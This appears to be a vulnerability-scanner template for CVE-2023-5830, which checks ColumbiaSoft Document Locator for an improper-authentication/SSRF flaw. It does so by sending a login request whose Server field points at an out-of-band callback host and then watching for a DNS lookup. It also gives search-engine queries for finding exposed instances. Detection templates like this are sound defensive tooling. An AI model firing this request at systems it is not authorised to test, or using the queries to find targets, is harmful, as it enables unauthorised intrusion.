http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - '"Authorized":false'
  matchers-condition: and
  raw:
  - "@timeout: 20s\nPOST /api/authentication/login HTTP/1.1\nHost: {{Hostname}}\n\
    Content-Type: application/json;charset=UTF-8\nOrigin: {{BaseURL}}\nReferer: {{BaseURL}}\n\
    \n{\n  \"LoginType\":\"differentWindows\",\n  \"User\":\"{{randstr}}\",\n  \"\
    Password\":\"{{rand_base(5, \"abc\")}}\",\n  \"Domain\":\"{{randstr}}\",\n  \"\
    Server\":\"{{interactsh-url}}\",\n  \"Repository\":\"{{randstr}}\"\n}\n"
id: CVE-2023-5830
info:
  author: Gonski
  classification:
    cpe: cpe:2.3:a:documentlocator:document_locator:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-5830
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-287
    epss-percentile: 0.99597
    epss-score: 0.90788
  description: 'Instances of ColumbiaSoft''s Document Locator prior to version 7.2
    SP4 and 2021.1 are vulnerable to an Improper Authentication/SSRF vulnerability.
    This template identifies vulnerable instances of the ColumbiaSoft Document Locater
    application by confirming external DNS interaction/lookups by modifying the value
    of the client-side SERVER parameter at /api/authentication/login.

    '
  impact: 'An attacker could exploit this vulnerability to gain unauthorized access
    to sensitive information.

    '
  metadata:
    fofa-query: title="document locator - webtools"
    google-query: intitle:"document locator - webtools"
    max-request: 1
    product: document_locator
    shodan-query:
    - title:"Document Locator - WebTools"
    - http.title:"document locator - webtools"
    vendor: documentlocator
  name: ColumbiaSoft DocumentLocator - Improper Authentication
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2023-5830
  - https://vuldb.com/?ctiid.243729
  - https://github.com/advisories/GHSA-j89v-wm7x-4434
  - https://vuldb.com/?id.243729
  remediation: 'Upgrade to a patched version of ColumbiaSoft DocumentLocator to fix
    the improper authentication issue.

    '
  severity: critical
  tags: cve,cve2023,ssrf,unauth,columbiasoft,intrusive,webtools,documentlocator,vkev,vuln
